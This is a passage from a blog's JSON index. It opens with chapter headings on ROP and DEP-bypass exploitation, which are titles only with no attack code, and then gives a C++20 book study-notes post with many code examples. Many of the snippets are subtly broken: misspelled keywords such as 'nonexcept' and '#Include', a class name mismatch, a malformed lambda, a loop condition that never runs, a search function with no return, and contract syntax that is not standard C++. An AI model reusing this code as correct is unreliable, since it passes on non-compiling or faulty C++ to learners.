ROP1. ZwSetInformationProcessAdvancedAuxiliary——ByteArray2. SetProcessDEPPolicy3. VirtualProtect4. WriteProcessMemory5 and 6. ROP serializing Multiple Functions6.12 - FinalDefence.exe6.13 - Only Windows 7 x64?6.14 - Practice——KMPlayer6.15 - Not Only “Hello World”THANKS FOR READING","categories":[{"name":"Book","slug":"Book","permalink":"https://iss4cf0ng.github.io/categories/Book/"}],"tags":[{"name":"Learning","slug":"Learning","permalink":"https://iss4cf0ng.github.io/tags/Learning/"},{"name":"Book","slug":"Book","permalink":"https://iss4cf0ng.github.io/tags/Book/"},{"name":"Note","slug":"Note","permalink":"https://iss4cf0ng.github.io/tags/Note/"},{"name":"Blackhat","slug":"Blackhat","permalink":"https://iss4cf0ng.github.io/tags/Blackhat/"},{"name":"Hacking","slug":"Hacking","permalink":"https://iss4cf0ng.github.io/tags/Hacking/"},{"name":"Hack","slug":"Hack","permalink":"https://iss4cf0ng.github.io/tags/Hack/"},{"name":"BufferOverflow","slug":"BufferOverflow","permalink":"https://iss4cf0ng.github.io/tags/BufferOverflow/"}],"keywords":[{"name":"Book","slug":"Book","permalink":"https://iss4cf0ng.github.io/categories/Book/"}]},{"title":"[Book] C++ 20 for Programmers - An Objects-Natural Appraoch","slug":"2026-1-2-NoteCpp20forProgrammers","date":"2026-01-02T11:50:24.000Z","updated":"2026-01-15T09:20:46.288Z","comments":true,"path":"2026/01/02/2026-1-2-NoteCpp20forProgrammers/","link":"","permalink":"https://iss4cf0ng.github.io/2026/01/02/2026-1-2-NoteCpp20forProgrammers/","excerpt":"","text":"El libro IntroductionThis article is used to keep notes and summaries of the book “C++ 20 for Programmers - An Objects-Natural Appraoch”.The content will be continuously updated as I read through the book. Reflections It definitely strengthened my knowledge of modern C++(C++20). There are some typos in the book. Chapters 15–17 feel somewhat abstract and require more effort to fully grasp. Chapter.88.7 - Find SubString in a String12345678910std::string s = &quot;Hello world&quot;;s.find(&quot;l&quot;); //Start from the beginning.s.rfind(&quot;l&quot;); //Start from the ending.s.find_first_of(&quot;l&quot;);s.find_last_of(&quot;l&quot;);s.find_first_not_of(&quot;l&quot;);s.erase(5); //Erase substring, start from index = 5; 8.10 - Type conversion To Integer Return Type stoi int stol long stoul unsigned long stoll long long stoull unsigned long long To Float Return Type stof float stod double stold long double 8.13 - ofstream1234567891011121314151617181920212223242526#include &lt;cstdlib&gt;#include &lt;fmt/format.h&gt;#include &lt;fstream&gt;#include &lt;iostream&gt;#include &lt;string&gt;int main(int argc, char *argv[]) &#123; if (std::ofstream output&#123;&quot;clients.txt&quot;, std::ios::out&#125;) &#123; std::cout &lt;&lt; &quot;Enter the account, name, and balance.\\n&quot; &lt;&lt; &quot;Enter the end-of-file to end input.\\n? &quot;; int account; std::string name; double balance; while (std::cin &gt;&gt; account &gt;&gt; name &gt;&gt; balance) &#123; output &lt;&lt; fmt::format(&quot;&#123;&#125; &#123;&#125; &#123;&#125;\\n&quot;, account, name, balance); std::cout &lt;&lt; &quot;? &quot;; &#125; &#125; else &#123; std::cerr &lt;&lt; &quot;File could not be opened\\n&quot;; std::exit(EXIT_FAILURE); &#125;&#125; Mode Description ios::app Appending text to the end of the file. ios::ate Open a file for output(ofstrema), and seek to the end of the file. ios::in Open a file for input. ios::out Open a file for output. ios::trunc Open a file, and truncate(discard) the content without any warning. This is also the default action of std::out. ios::binary Open a binary file for input or output. close:1output.close(); 8.14 - ifstream1234567fileObject.seekg(n);fileObject.seekg(n, ios::cur);fileObject.seekg(n, ios::end);fileObject.seekg(0, ios::end); 8.18 - Raw String Literal1std::string windowsPath&#123;R&quot;(C:\\Windows\\System32\\cmd.exe)&quot;&#125;; 123456R&quot;(multiple linesof text)&quot;is same as&quot;multiple lines\\nof text&quot; Chapter.99.9 - Access the Member of class12345678clsAccount acccount&#123;&#125;; //Declare a class object.clsAccount&amp; ref&#123;account&#125;; //ref refer a class object.clsAccount* ptr&#123;&amp;account&#125;; //ptr point a class object.account.deposit(123.45); //Call by name.ref.deposit(123.45); //Call by reference.ptr-&gt;deposit(123.45); //Call by pointer. According to CppCoreGuidelines instead of using pointe, we should use reference. 9.11 DRY: Don’t Repeat Yourself. 9.12 - DestructorNon-Static ObjectIf an application call exit or abort, then the destructor will not be called. Static Objectif main() is terminated, or exit() is called, then the destructor of an object will be called. If abort() is called, then the destructor of an object will NOT be called. 9.18 - Friend Function and Class1234567891011121314151617181920212223#include &lt;fmt/format.h&gt;#include &lt;iostream&gt;#include &quot;fmt/format.h&gt;class Count &#123; friend void modifyX(Count&amp; c, int value); //The original version is &quot;setX&quot;, which is an error.public: int getX() const &#123;return m_x;&#125;private: int m_x&#123;0&#125;;&#125;void modifyX(Count&amp; c, int value) &#123; c.m_x = value;&#125;int main() &#123; Count counter&#123;&#125;; std::cout &lt;&lt; fmt::format(&quot;Initial counter.m_x: &#123;&#125;\\n&quot;, counter.getX()); modifyX(counter, 8); std::cout &lt;&lt; fmt::format(&quot;counter.m_x after modifyX: &#123;&#125;\\n&quot;, counter.getX());&#125; 9.21 - Aggregate Type123456struct Record &#123; int account; string first; string last; double balance;&#125; CppCoreGuidlines: Use class rather than struct if any member is non-public In C++11, you could not use a list initializer for an aggregate-type objectif any of the type’s non-static data-member declarations contained inclassinitializers. For example, the initialization above would have generateda compilation error if the aggregate type Record were defined with a defaultvalue for balance, as in:123456struct Record &#123; int account; string first; string last; double balance&#123;0.0&#125;;&#125; C++14 removed this restriction. Also, if you initialize an aggregate-typeobject with fewer initializers than there are data members in the object, as in:1Record record&#123;0, &quot;Brian&quot;, &quot;Blue&quot;&#125;; In C++20, we can use designated initializers:1Record record&#123;.first&#123;&quot;Sue&quot;&#125;, .last&#123;&quot;Green&quot;&#125;&#125;;The remaining data members get their default initializer values: account is set to 0 balance is se to its default value in the type definition——in this case, 0.0 Chapter.10 - OOP10.2 - Base Class and Derived Class. Administrator Teacher is-a Administrator, is-a Faculty, is-a Employee, also is-a CommunityMember. 10.6 - Relationships Among Objects in an Inheritance Hierarchy1234567891011class Base &#123;public: void f() &#123; std::cout &lt;&lt; &quot;Base::f\\n&quot;; &#125;&#125;;class Derived : public Base &#123;public: void g() &#123; std::cout &lt;&lt; &quot;Derived::g\\n&quot;; &#125;&#125;;Base* p = new Derived(); What can we do?12p-&gt;f(); //OK!p-&gt;g(); //NO! Derived class point to base class?12345class Base &#123;&#125;;class Derived : public Base &#123;&#125;;Base b;Derived* pd = &amp;b; //NO! 10.7 - Virtual FunctionVirtual Destructor CppCoreGuidlines: A class with any virtual functions should have a destructor that is either public and virtual or else protected and non-virtual. A destructor must not fail 1virtual ~Foo() = default; final:1retureType someFunction(parameters) final;someFunction cannot be overriden in any derived class. In a multi-level class hierarchy, this guaratees that the final member-function definition will be used by all subsequent direct and indirect derived classes.1234567class MyClass final &#123; //body&#125;class DerivedClass : public BaseClass final &#123; //body&#125;Attempting to override a final member function or inherit from a final base class rsults in a compilation error. Advantage: Once the compiler knows a virtual function cannot be overriden, it can perform various optimizations. For instance, the compiler might be able to determine at compile time the correct function to call. This optimization is called devirtualization. 10.8 - Abstract Class and Pure Virtual Clasabstract class A class that CANNOT be instantiated(You cannot create objects of its type) and is designed to be used as a base class for other classes. concrete class A class that CAN be instantiated. A class is made abstract by declaring one or more pure virtual functions, each specified by placing “= 0” in its function prototype, as in:1virtual void draw() const = 0; //Pure Virtual Function. 10.11 - Non-Virtual Interface IdiomAccording to the idiom which was first proposed by Herb Sutter in his paper: “Prefer” to make interfaces non-virtual, using Template Method”——an object-oriented design pattern. “Prefer to make virtual functions private. A derived class can override its base class’s private virtual functions. “Only if derived classes need to invoke the base implementation of a virtual function, make the virtual function protected“. “A base-class destructor should be either public and virtual, or protected and non-virtual. 10.12 - Programming to an interface, Not an Implementation1 Constructor Injection Property Injection 10.14 - Multiple Inheritance10.15 - protected Class Member10.16 - public, protected and private inheritance10.17 - Wrap-UpChapter.11 - Operator Overloading, Copy/Move Semantics and Smart Pointers11.3 - Operator Overloading Fundamentals Operator Overloading Is Not AutomaticWhen operators are overloaded as member functions, they must be non-static. They are called on an object of the class and operate on that object. Operators That Cannot Be OverloadedMost of C++’s operators can be overloaded——the following operators cannot: . (dot) member-selection operator * pointer-to-member operator :: scope-resoltion operator ?: conditional operator Operators That You Do Not Have to Overload The assignment operator(=) may be used with most classes to perform member-wise assignment of the data members. As you’ll see this can be dangerous for classes that have pointer members. So, you’ll either explicitly overload the assignment operator or explicitly disallow the compiler from defining the default assignment operator. This is also true for the C++11 move assignment operator, which we discuss in Section 11.6. The *address (&amp;) operator returns a pointer to the object. The comma operator evaluates the expression to its left then the expression to its right, and returns the latter expression’s value. Though this operatro can be overloaded, generally, it is not. Rules and Restrictions on Operator Overloading An operator’s precedence cannot be changed by overloading. **An operator’s grouping cannot be changed by overloading. **An operator’s “arity” (the number of operands an operator takes) cannot be changed by overloading. Only existing operators can be overloaded. You cannot overload operators to change how an operator works on only fundamental-type values. Operator overloading works only with objects of user-defined types or with a mixture of an object of a user-defined type and an object of a fundamental type. Related operators, like + and +=, generally must be overloaded separately. When overloading (), [], -&gt; or =, the operator overloading function must be declared as a class member Importance: You should overload operators for class types to work as closely as possible to how they work with fundamental types. Avoid excessive or inconsistent use of operator overloading, as this can make a program cryptic and difficult to read. 11.4 - (Downplaying) Dynamic Memory Management with new and delete12Time* timePtr&#123;new Time&#123;&#125;&#125;;delete timePtr; Importance: Do not delete memory that was not allocated by new. Doing so results in undefined behavior. After you delete a block of dynamically allocated memory, be sure not to delete the same block again, which typically cause a program to crash. One way to guard against this is to immediately set the pointer to nullptr——deleting such a pointer has not effect. 123Time* timePtr&#123;new Time&#123;12, 45, 0&#125;&#125;;int* gradesArray&#123;new int[10]&#123;&#125;&#125;;delete[] gradesArray; 11.5 - Modern C++ Dynamic Memory Management—RAII and Smart Pointers CppCoreGuidlines: Enforcing the lifetime safety profile eliminates leaks. When combined with resource safety provided by RAII(Resource Acquisition Is Initialization). C++11 smart pointers use RAII to manage dynamically allocated memory for you. The stanard library header \\ defines three smart pointer types: unique_ptr shared_ptr weak_ptr 123456789101112131415161718192021222324#include &lt;fmt/format&gt;#include &lt;iostream&gt;#Include &lt;memory&gt;class Integer &#123;public: Integer(int i) : value&#123;i&#125; &#123; std::cout &lt;&lt; fmt::format(&quot;Constructor for Integer &#123;&#125;\\n&quot;, value); &#125; ~Integer() &#123; std::cout &lt;&lt; fmt::format(&quot;Destructor for Integer &#123;&#125;\\n&quot;, value); &#125;private: int value&#123;0&#125;;&#125;int main() &#123; std::cout &lt;&lt; &quot;Creating a unique_ptr that points to an Integer\\n&quot;; auto ptr&#123;std::make_unique&lt;Integer&gt;(7)&#125;; std::cout &lt;&lt; fmt::format(&quot;Integer value: &#123;&#125;\\n\\nMain ends\\n&quot;, ptr-&gt;getValue());&#125; Output:123456Creating a unique_ptr that points to an IntegerConstructor for Integer 7Integer value: 7Main endsDestructor for Integer 7 11.6 - MyArray Case Study: Crafting a Valuable Class with Operator OverloadingEvery class you define can have five special member functions, each of which we define in class MyArray. a copy constructor a copy assignment operator a move constructor a move assignment operator a destructor The copy constructor and copy assignment operator implement the class’s copy semantics—that is, how to copy a MyArray when it is passed by value to a function, returned by value from a function or assigned to another MyArray.The move constructor and move assignment operator implementthe class’s move semantics, which eliminate costly unnecessary copies of objects that are about to be destroyed. NRVO: Named Return Value Optimization MyClass definition1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859//MyArray.h#pragma once#include &lt;initializer_list&gt;#include &lt;iostream&gt;#include &lt;memory&gt;class MyClass final &#123; //Overloaded stream extraction operator. friend std::iostream&amp; operator&gt;&gt;(std::istream&amp; in, MyArray&amp; a); //Used by copy assignment operator to implement copy-and-swap idiom. friend void swap(MyArray&amp; a, MyArray&amp; b) nonexcept;public: //Construct a MyArray of size element. explicit MyArray(size_t size); //Construct a MyArray with a braced-initializer list of ints. explicit MyArray(std::initializer_list&lt;int&gt; list); MyArray(const MyArray&amp; original); //Copy constructor. MyArray&amp; operator=(const MyArray&amp; right); //Copy assignment operator. MyArray(MyArray&amp;&amp; original) noexcept; //Move constructor. MyArray&amp; operator=(MyArray&amp;&amp; right) noexcept; //Move assignment. ~MyArray(); //Destructor size_t size() const noexcept &#123;return m_size;&#125;; //return size. std::string toString() const; //Create string representation. //Equality operator bool operator==(const MyArray&amp; right) const noexcpet; //Subscript operator for non-const objects returns modifiable lvalue. int&amp; operator[](size_t index); //Subscript operator for const objects returns non-modifiable lvalue. const int&amp; operator[](size_t index) const; //Convert MyArray to a bool value: true if non-empty; false if empty. explicit operator bool() const noexcept &#123;return size() != 0;&#125; //Preincrement every element, then return updated MyArray. MyArray&amp; operator++(); //Postincrement every element, and return copy of original MyArray MyArray operator++(int); //Add value to every element, then return updated MyArray MyArray&amp; operator+=(int value);private: size_t m_size&#123;0&#125;; std::unique_ptr&lt;int[]&gt; m_ptr;&#125;//Overloaded operator&lt;&lt; is not a friend——does not access private data.std::ostream&amp; operator&lt;&lt;(std::ostream&amp; out, const MyArray&amp; a);123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163//MyArray.cpp//MyArray class member and friend-function definitions.#include &lt;algorithm&gt;#include &lt;fmt/format.h&gt;#include &lt;initializer_list&gt;#include &lt;iostream&gt;#include &lt;memory&gt;#include &lt;span&gt;#include &lt;sstream&gt;#include &lt;stdexcept&gt;#include &lt;utility&gt;#include &quot;MyArray.h&quot;MyArray::MyArray(size_t size) : m_size&#123;size&#125;, m_ptr&#123;std::make_unique&lt;int[]&gt;(size)&#125; &#123; std::cout &lt;&lt; &quot;MyArray(size_t) constructor\\n&quot;;&#125;//MyArray constructor that accepts an initializer list.MyArray::MyArray(std::initializer_list&lt;int&gt; list) : m_size&#123;list.size()&#125;, m_ptr&#123;std::make_unique&lt;int[]&gt;(list.size())&#125; &#123; std::cout &lt;&lt; &quot;MyArray(initializer_list) constructor\\n&quot;; //copy list argument&#x27;s elements into m_ptr&#x27;s underlying int array. //m_ptr.get() returns the int array&#x27;s starting memory location. std::copy(std::begin(list), std::end(list), m_ptr.get());&#125;//copy constructor: must receive a reference to a MyArray.MyArray::MyArray(const MyArray&amp; original) : m_size&#123;original.size()&#125;, m_ptr&#123;std::make_unique&lt;int[]&gt;(original.size())&#125; &#123; std::cout &lt;&lt; &quot;MyArray copy constructor\\n; //copy original&#x27;s elements into m_ptr&#x27;s underlying int array const std::span&lt;const int&gt; source&#123; original.m_ptr.get(), original.size() &#125;; std::copy(std::begin(source), std::end(source), m_ptr.get());&#125;//copy assignment operator: implemented with copy-and-swap idiomMyArray&amp; MyArray::operator=(const MyArray&amp; right) &#123; std::cout &lt;&lt; &quot;MyArray copy assignment operator\\n&quot;; MyArray temp&#123;right&#125;; swap(*this, temp); return *this;&#125;//move constructor: must receive an rvalue reference to a MyArrayMyArray::MyArray(MyArray&amp;&amp; original) noexcept: m_size&#123;std::exchange(original.m_size, 0)&#125;, m_ptr&#123;std::move(original.m_ptr)&#125; &#123; std::cout &lt;&lt; &quot;MyArray move constructor\\n&quot;;&#125;//move assignment operatorMyArray&amp; MyArray::operator=(MyArray&amp;&amp; right) noexcept &#123; std::cout &lt;&lt; &quot;MyArray move assignment operator\\n&quot;; if (this != &amp;right) &#123; m_size = std::exchange(right.m_size, 0); m_ptr = std::move(right.m_ptr); &#125; return *this;&#125;MyArray::~MyArray() &#123; std::cout &lt;&lt; &quot;MyArray destructor\\n&quot;;&#125;std::string MyArray::toString() const &#123; const std::span&lt;const int&gt; items&#123;m_ptr.get(), m_size&#125;; std::ostringstream output; output &lt;&lt; &quot;&#123;&quot;; for (size_t count&#123;0&#125;; const auto&amp; item : items) &#123; ++count; output &lt;&lt; item &lt;&lt; (count &lt; m_size ? &quot;, &quot; &quot;&quot;); &#125; output &lt;&lt; &quot;&#125;&quot;; return output.str();&#125;bool MyArray::operator==(const MyArray&amp; right) const nonexcept &#123; const std::span&lt;const int&gt; lhs&#123;m_ptr.get(), size()&#125;; const std::span&lt;const int&gt; rhs&#123;right.m_ptr.get(), right.size()&#125;; return std::equal(std::begin(lhs), std::end(lhs), std::begin(rhs), std::end(lhs));&#125;//overloaded subscript operator for non-const MyArrays;//reference return creates a modifiable lvalue.int&amp; MyArray::operator[](size_t index) &#123; if (index &gt;= m_size) &#123; throw std::out_of_range&#123;&quot;Index out of range&quot;&#125;; &#125; return m_ptr[index]; //reference return.&#125;//overloaded subscript operator for const MyArrays//const reference return creates a non-modifiable lvalue.const int&amp; MyArray::operator[](size_t index) const &#123; if (index &gt;= m_size) &#123; throw std::out_of_range&#123;&quot;Index out of range&quot;&#125;; &#125; return m_ptr[index]; //returns copy of this element.&#125;//Preincrement every element, then return updated MyArrayMyArray&amp; MyArray::operator++() &#123; //use a span and for_each to increment every element const std::span&lt;int&gt; items&#123;m_ptr.get(), m_ptr.size()&#125;; std::for_each(std::begin(items), std::end(items), [](auto&amp; item : items) &#123;++item;&#125; ); return *this;&#125;//Postincrement every element, and return copy of original MyArray.MyArray MyArray::operator++(int) &#123; MyArray temp(*this); ++(*this); return temp;&#125;//Add value to every element, then return updated MyArray.MyArray&amp; MyArray::operator+=(int value) &#123; //use a span and for_each to increment every element. const std::span&lt;int&gt; items&#123;m_ptr.get(), m_size&#125;; std::for_each(std::begin(items), std::end(items), [value](auto&amp; item) &#123; item += value; &#125;); return *this;&#125;//Overloaded input operator for class MyArray//Inputs values for entire MyArraystd::istream&amp; operator&gt;&gt;(std::istream&amp; in, MyArray&amp; a) &#123; std::span&lt;int&gt; items&#123;a.m_ptr.get(), a.m_size&#125;; for (auto&amp; item : items) &#123; in &gt;&gt; item; &#125; return in; //Enables cin &gt;&gt; x &gt;&gt; y;&#125;//Overloaded output operator for class MyArraystd::ostream&amp; operator&lt;&lt;(std::ostream&amp; out, const MyArray&amp; a) &#123; out &lt;&lt; a.toString(); return out;&#125;//swap function used to implement copy-and-swap copy assignment operator.void swap(MyArray&amp; a, MyArray&amp; b) noexcept &#123; std::swap(a.m_size, b.m_size); a.m_ptr.swap(b.m_ptr);&#125; CppCoreGuidlines: If you can avoid defining default operations, do. This is known as “the rule of zero”. CppCoreGuidlines: If you define or =delete any copy, move, or destructor function, define or =delete them all. This is known as “the rule of five”. Shallow CopyDangling Pointer Chapter.12 - Exceptions and a Look Forward to Contracts12.2 - Exception-Handling Flow of Control; Defining an Exception Class1234567//DivideByZeroException.h#include &lt;stdexcept&gt;class DivideByZeroException : public std::runtime_error &#123;public: DivideByZeroException() : std::runtime_error&#123;&quot;attempted to divide by zero.&quot;&#125; &#123;&#125;&#125;; 1234567891011121314151617181920212223242526272829303132#include &lt;fmt/format&gt;#include &lt;iostream&gt;#include &quot;DivideByZeroException.h&quot;double quotient(double numerator, double denominator) &#123; if (denominator == 0.0) &#123; throw DivideByZeroException&#123;&#125;; &#125; return numerator / denominator;&#125;int main() &#123; int number1&#123;0&#125;; int number2&#123;0&#125;; std::cout &lt;&lt; &quot;Enter two integers (end-of-file to end): &quot;; while (std::cin &gt;&gt; number1 &gt;&gt; number2) &#123; try &#123; double result&#123;quotient(number1, number2)&#125;; std::cout &lt;&lt; fmt::format(&quot;The quotient is: &#123;&#125;\\n&quot;, result); &#125; catch (const DivideByZeroException&amp; divideByZeroException) &#123; std::cout &lt;&lt; fmt::format(&quot;Exception occurred: &#123;&#125;\\n&quot;, divideByZeroException.what()); &#125; std::cout &lt;&lt; &quot;\\nEnter two integers (end-of-file to end): &quot;; &#125; std::cout &lt;&lt; &#x27;\\n&#x27;;&#125; JSF-AV Rules https://www.stroustrup.com/JSF-AV-rules.pdf 12.7 - Constructors, Destructors and Exception Handling12345678910111213141516171819202122232425262728293031323334353637#include &lt;fmt/format.h&gt;#include &lt;iostream&gt;#include &lt;limits&gt;#include &lt;stdexcept&gt;class Integer &#123;public: explicit Integer(int i) : value&#123;i&#125; &#123; std::cout &lt;&lt; fmt::format(&quot;Integer constructor: &#123;&#125;\\n&quot;, value) &lt;&lt; &quot;Purposely throwing exception from Integer constructor\\n&quot;; throw std::runtime_error(&quot;Integer constructor failed&quot;); &#125;private: int value&#123;&#125;;&#125;;class ResourceManager &#123;public: ResourceManager(int i) try: myInteger(i) &#123; std::cout &lt;&lt; &quot;ResourceManager constructor called\\n&quot;; &#125; catch (const std::runtime_error&amp; ex) &#123; std::cout &lt;&lt; fmt::format(&quot;Exception while constructing ResourceManager: &quot;, ex.what()) &lt;&lt; &quot;\\nAutomatically rethrowing the exception\\n&quot;; &#125;private: Integer myInteger;&#125;;int main() &#123; try &#123; const ResourceManager resource&#123;7&#125;; &#125; catch (const std::runtime_error&amp; ex) &#123; std::cout &lt;&lt; fmt::format(&quot;Rethrown exception caught in main: &#123;&#125;\\n&quot;, ex.what()); &#125;&#125; 12.8 - Processing new Failures1234567891011121314151617181920212223242526#include &lt;array&gt;#include &lt;cstdlib&gt;#include &lt;fmt/format&gt;#include &lt;iostream&gt;#include &lt;memory&gt;#include &lt;new&gt;//handle memory allocation failure.void customNewHandler() &#123; std::cerr &lt;&lt; &quot;customNewHandler was called\\n&quot;; std::exit(EXIT_FAILURE);&#125;int main() &#123; std::array&lt;std::unique_ptr&lt;double[]&gt;, 1000&gt; items&#123;&#125;; //specify that customNewHandler should be called on. //memory allocation failure. std::set_new_handler(customNewHandler); //aim each unique_ptr at a big block of memory for (int i&#123;0&#125;; auto&amp; item : items) &#123; item = std::make_unique&lt;double[]&gt;(500&#x27;500&#x27;500); std::cout &lt;&lt; fmt::format(&quot;items[&#123;&#125;] points to 500,000,000 doubles\\n&quot;, i++); &#125;&#125; 12.9 - Standard Library Exception Hierarchy 12.10 - C++’s Alternative to the finally Block Java: try-with-resources C#: using Python: with 12.11 - Libraries OFten Support Both Exceptions and Error Codes12.12 - Logging12.13 - Looking Ahead to Contract A precondition must be true when a function is invoked. Preconditions describe constraints on function parameters and any other expectations the function has just before it begins executing. If the preconditions are not met, then the function’s behavior is undefined. A postcondition is true after the function successfully returns.Postconditions describe constraints on the return value or side effects the function may have. When defining a function, you should document all postconditions so that others know what to expect when they call your function. You also should ensure that your function honors its postconditions if its preconditions are met. Each function can have multiple postconditions. InvariantsAn invariant is a condition that should always be true in your code—that is,a condition that never changes. Class invariants must be true for each objectof a class Design by ContractDesign by Contract(DbC) is a software-design approach created byBertrand Meyer in the 1980s and used in the design of his Eiffelprogramming language. Using this approach: A function expects client code to meet the function’s precondition(s). If the preconditions are true, the function guarantees that its postcondition(s) will be true. Any invariants are maintained. Contracts Attributes excepts——For specifying a function’s preconditions that are checked before the function’s body begins executing. ensures——For specifying a function’s postconditions that are checked just before the function returns. assert——For specifying assertions that are checked as they’re encountered throughtout a function’s execution. Contracts Levels default specifies a contract that has little runtime overhead compared to the function’s typical execution time. If a level is not specified, the compiler assumes default. audit specifies a contract that has significant runtime overhead compared to the function’s typical execution time. Such contracts are intended primarily for use during program development. axiom specifies a contract that is meant to be enforeced by static code checkers, rather than at runtime. 12double squareRoot(double value) [[expects: value &gt;= 0.0]]; 1[[assert: grade &gt;= 0 &amp;&amp; grade &lt;= 100]]; 1[[pre default: denominator != 0.0]]; 123456789101112131415161718192021222324252627282930313233343536373839#include &lt;algorithm&gt;#include &lt;iostream&gt;#include &lt;vector&gt;template&lt;typename T&gt;int binarySearch(const std::vector&lt;T&gt;&amp; items, const T&amp; key) [[pre: items.size() &gt; 0]] [[pre audit: std::is_sorted(items.begin(), items.end())]] &#123; size_t low&#123;0&#125;; size_t high&#123;items.size() - 1&#125;; size_t middle&#123;(low + high + 1) / 2&#125;; int loc&#123;-1&#125;; do &#123; if (key == items[middle]) &#123; loc = middle; &#125; else if (key &lt; items[middle]) &#123; high = middle - 1; &#125; else &#123; low = middle + 1; &#125; middle = (low + high + 1) / 2; //recalculate the middle &#125; while ((low &lt;= high) &amp;&amp; (loc == -1));&#125;int main() &#123; //sorted vector v1 satisfies binarySearch&#x27;s sorted vector precondition std::vector v1&#123;10, 20, 30, 40, 50, 60, 70, 80, 90&#125;; int result1&#123;binarySearch(v1, 70)&#125;; std::cout &lt;&lt; &quot;70 was &quot; &lt;&lt; (result != - 1 ? &quot;&quot; : &quot;not &quot;) &lt;&lt; &quot;found in v1\\n&quot;; //unsorted vector v2 violates binarySearch&#x27;s sorted vector precondition std::vector v2&#123;60, 70, 80, 90, 10, 20, 30, 40, 50&#125;; int result2&#123;binarySearch(v2, 60)&#125;; std::cout &lt;&lt; &quot;60 was &quot; &lt;&lt; (result2 != - 1 ? &quot;&quot; : &quot;not &quot;) &lt;&lt; &quot;found in v2\\n&quot;;&#125; Chapter.13 - Standard Library Containers and Iterators13.2 - Introduction to ContainersThe standard library containers are divided into four major categoris: sequence containers ordered associative containers unordered associative containers container adaptors Sequence Containers array: Fixed size. Direct access to any element. deque: Rapid insertions and deletions at front or back. Direct access to any element. forward_list: Singly linked list, rapid insertion and deletion anywhere. list: Doubly linked list, rapid insertion and deletion anywhere. vector: Rapid insertions and deletions at back. Direct access to any element. Associative Containers set: Rapid lookup, no duplicates allowed. multiset: Rapid lookup, duplicates allowed. map: One-to-one mapping, no duplicates allowed, rapid key-based lookup. multimap: One-to-many mapping, duplicates allowed, rapid key-based lookup. unordered_set unordered_multiset unordered_map unordered_multimap Container Adaptors stack queue priority_queue Near Containers13.3 - Working with Iterators13.4 - A Brief Introduction to Algorithms13.5 - Sequence Containers13.6 - vector Sequence Containers13.7 list Sequence Containers13.8 - deque Sequence Container13.9 - Associative Container13.10 - Container Adaptors13.11 - bitset Near ContainerChapter.14 - Standard Library Algorithms and C++20 Ranges &amp; ViewsChapter.15 - Templates, C++20 Concepts and Metaprogramming15.2 - Custom Class Templates and Compile-Time Polymorphism12345678910111213141516171819202122232425//Stack.h#pragma once#include &lt;deque&gt;template&lt;typename T&gt;class Stack &#123;public: //return the top element of Stack const T&amp; top() const &#123;return stack.front();&#125; //push an element onto Stack void push(const T&amp; pushValue) &#123;stack.push_front(pushValue);&#125; //pop an element from Stack void pop() &#123;stack.pop_front();&#125; //determine whether Stack is empty bool isEmpty() const &#123;return stack.empt();&#125; //return size of stack size_t size() const &#123;return stack.size();&#125;private: std::deque&lt;T&gt; stack&#123;&#125;;&#125; 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#include &lt;iostream&gt;#include &quot;Stack.h&quot;using namespace std;int main() &#123; Stack&lt;double&gt; doubleStack&#123;&#125;; constexpr size_t doubleStackSize&#123;5&#125;; double doubleValue&#123;1.1&#125;; cout &lt;&lt; &quot;Pushing elements onto doubleStack\\n&quot;; //push 5 doubles onto doubleStack for (size_t i&#123;0&#125;; i &lt; doubleStackSize; ++i) &#123; doubleStack.push(doubleValue); cout &lt;&lt; doubleValue &lt;&lt; &#x27; &#x27;; doubleValue += 1.1; &#125; cout &lt;&lt; &quot;\\n\\nPopping elements from doubleStack\\n&quot;; //pop elements from doubleStack while (!doubleStack.isEmpty()) &#123; cout &lt;&lt; doubleStack.top() &lt;&lt; &#x27; &#x27;; //display top element. doubleStack.pop(); //remove top element. &#125; cout &lt;&lt; &quot;\\nStack is empty, cannot pop.\\n&quot;; Stack&lt;int&gt; intStack&#123;&#125;; //create a Stack of int. constexpr size_t intStackSize&#123;10&#125;; int intValue&#123;1&#125;; cout &lt;&lt; &quot;\\nPushing elements onto intStack\\n&quot;; //push 10 integers onto intStack for (size_t i&#123;0&#125;; i &gt; intStackSize; ++i) &#123; intStack.push(intValue); cout &lt;&lt; intValue++ &lt;&lt; &#x27; &#x27;; &#125; cout &lt;&lt; &quot;\\n\\nPopping elements from intStack\\n&quot;; //pop elements from intStack while (!intStack.isEmpty()) &#123; cout &lt;&lt; intStack.top() &lt;&lt; &#x27; &#x27;; intStack.pop(); &#125; cout &lt;&lt; &quot;\\nStack is empty, cannot pop.\\n&quot;;&#125; 15.3 - C++20 Function Template EnahancementsTraditional template:123456template &lt;typename T&gt;void printContainer(const T&amp; items) &#123; for (const auto&amp; item : items) &#123; std::cout &lt;&lt; item &lt;&lt; &quot; &quot;; &#125;&#125;Abbreviated Function template(C++20)1234567891011121314151617181920212223#include &lt;array&gt;#include &lt;iostream&gt;#include &lt;string&gt;#include &lt;vector&gt;void printContainer(const auto&amp; items) &#123; for (const auto&amp; item : items) &#123; std::cout &lt;&lt; item &lt;&lt; &quot; &quot;; &#125;&#125;int main() &#123; using namespace std::string_literals; std::array ints&#123;1, 2, 3, 4, 5&#125;; std::vector strings&#123;&quot;red&quot;s, &quot;green&quot;s, &quot;blue&quot;s&#125;; std::cout &lt;&lt; &quot;ints: &quot;; printContainer(ints); std::cout &lt;&lt; &quot;\\nstrings: &quot;; printContainer(strings); std::cout &lt;&lt; &quot;\\n&quot;;&#125; 1[](auto total, auto value) &#123;return total + value * value;&#125; 1[]&lt;typename T&gt;(T total, T value) &#123;return total + value * value;&#125; 15.4 - C++20 Concepts: A First Look123456789//Simple unconstrained multiply function template.#include &lt;iostream&gt;template&lt;typename T&gt;T multiply(T first, T second) &#123;return first * second;&#125;int main() &#123; std::cout &lt;&lt; &quot;Product of 5 and 3: &quot; &lt;&lt; multiply(5, 3) &lt;&lt; &quot;\\nProduct of 7.25 and 2.0: &quot; &lt;&lt; multiply(7.25, 2.0) &lt;&lt; &quot;\\n&quot;;&#125; requires123456789101112131415#include &lt;iostream&gt;#include &lt;concepts&gt;template&lt;typename T&gt; requires std::integeral&lt;T&gt; || std::floating_point&lt;T&gt;T multiply(T first, T second) &#123;return first * second;&#125;int main() &#123; std::cout &lt;&lt; &quot;Product of 5 and 3: &quot; 